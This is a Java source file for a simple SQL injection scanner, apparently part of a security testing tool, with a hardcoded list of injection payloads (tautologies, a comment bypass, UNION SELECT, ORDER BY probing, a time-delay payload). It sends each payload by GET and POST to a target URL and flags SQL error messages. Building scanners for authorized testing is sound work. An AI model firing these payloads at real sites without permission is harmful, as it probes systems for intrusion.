package com.trinetra.attacks.scanner;

import com.trinetra.utils.Logger;
import java.util.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStreamWriter;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SQLInjectionScanner {
    private static final List<String> SQL_PAYLOADS = Arrays.asList(
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL,NULL--",
        "' OR 1=1--",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "'; WAITFOR DELAY '0:0:10'--"
    );

    public Map<String, List<String>> scanForSQLInjection(String targetUrl) {
        Map<String, List<String>> vulnerabilities = new HashMap<>();
        List<String> foundVulnerabilities = new ArrayList<>();

        for (String payload : SQL_PAYLOADS) {
            try {
                // Test GET parameters
                String testUrl = targetUrl + "?id=" + java.net.URLEncoder.encode(payload, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(testUrl).openConnection();
                conn.setRequestMethod("GET");
                
                // Check response
                int responseCode = conn.getResponseCode();
                String response = readResponse(conn);
                
                // Look for SQL error messages
                if (response.toLowerCase().contains("sql") || 
                    response.toLowerCase().contains("mysql") ||
                    response.toLowerCase().contains("oracle") ||
                    response.toLowerCase().contains("syntax error")) {
                    foundVulnerabilities.add("Potential SQL Injection (GET): " + payload);
                    Logger.warn("Found potential SQL injection vulnerability with payload: " + payload);
                }

                // Test POST parameters
                conn = (HttpURLConnection) new URL(targetUrl).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                
                try (OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream())) {
                    writer.write("id=" + java.net.URLEncoder.encode(payload, "UTF-8"));
                }

                response = readResponse(conn);
                if (response.toLowerCase().contains("sql") || 
                    response.toLowerCase().contains("mysql") ||
                    response.toLowerCase().contains("oracle") ||
                    response.toLowerCase().contains("syntax error")) {
                    foundVulnerabilities.add("Potential SQL Injection (POST): " + payload);
                    Logger.warn("Found potential SQL injection vulnerability with POST payload: " + payload);
                }

            } catch (Exception e) {
                Logger.error("Error during SQL injection scan: " + e.getMessage());
            }
        }

        if (!foundVulnerabilities.isEmpty()) {
            vulnerabilities.put("SQL Injection", foundVulnerabilities);
        }

        return vulnerabilities;
    }

    private String readResponse(HttpURLConnection conn) throws Exception {
        StringBuilder response = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                conn.getResponseCode() >= 400 ? conn.getErrorStream() : conn.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
        }
        return response.toString();
    }
}